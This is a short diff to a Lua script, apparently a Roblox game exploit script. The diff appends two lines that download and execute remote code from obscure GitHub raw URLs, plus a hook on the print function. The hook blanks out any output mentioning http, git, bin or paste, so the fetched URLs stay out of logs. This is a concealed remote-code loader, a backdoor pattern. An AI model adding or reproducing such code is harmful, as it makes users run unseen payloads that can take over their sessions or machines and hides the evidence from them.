@@ -536,3 +536,16 @@ local Script = {Functions = {}}
         end
     end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/idontplaythis/idekwhyitshere/main/idekwhy"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/idontplaythis/idekwhyitshereagain/main/idekwhypt2"))()
+
+
+local denied_message = "Denied Goofy"
+local g
+g = hookfunction(print,function(urprint,...)
+   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
+       urprint = denied_message
+   end
+ return g(urprint,...)
+end)
